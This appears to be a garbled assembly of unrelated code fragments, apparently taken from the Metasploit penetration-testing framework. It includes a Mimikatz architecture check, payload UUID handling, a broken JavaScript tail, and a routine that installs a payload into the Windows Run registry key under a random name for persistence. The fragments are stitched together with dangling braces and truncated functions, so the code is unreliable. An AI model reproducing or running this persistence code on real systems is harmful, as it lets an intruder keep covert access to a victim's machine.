
        
            si = client.sys.config.sysinfo
    if client.arch == ARCH_X86 && si['Architecture'] == ARCH_X64
      print_warning('Loaded x86 Mimikatz on an x64 architecture.')
      print_line
    end
    
        # Handle user-specified raw payload UID values
    if datastore['PayloadUUIDRaw'].to_s.length > 0
      puid_raw = [datastore['PayloadUUIDRaw'].to_s].pack('H*')
      if puid_raw.length != 8
        raise ArgumentError, 'The PayloadUUIDRaw value must be exactly 16 bytes of hex'
      end
      conf.delete(:seed)
      conf[:puid] = puid_raw
    end
    
    
    {
    {
    {
    {
    {
    {
    {              fc();
            }, 100);
          }
        } else {
          location.reload();
        }
        dobreak = 1;
        break;
      }
    }
    if (dobreak) break;
  }
  location.reload();
}
    
    # General
require 'msf/core/constants'
require 'msf/core/exceptions'
require 'msf/core/data_store'
require 'msf/core/option_container'
    
        when /osx|bsd/
      [
        '/Applications/Google Chrome.app',
        '/Applications/Firefox.app'
      ].each do |browser_path|
        if file?(browser_path)
          found_browser_path = browser_path
          break
        end
      end
    when /linux|unix/
      # Need to add support for Linux in the future.
      # But you see, the Linux meterpreter is so broken there is no point
      # to do it now. You can't test anyway.
    end
    
      # Function to install payload in to the registry HKLM or HKCU
  #-------------------------------------------------------------------------------
  def write_to_reg(key, script_on_target)
    nam = datastore['StartupName'] || Rex::Text.rand_text_alpha(rand(8) + 8)
    print_status('Installing into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}')
    if key
      registry_setvaldata('#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', nam, script_on_target, 'REG_SZ')
      print_good('Installed into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}')
      @clean_up_rc << 'reg deleteval -k '#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -v '#{nam}'\n'
    else
      print_error('Error: failed to open the registry key for writing')
    end
  end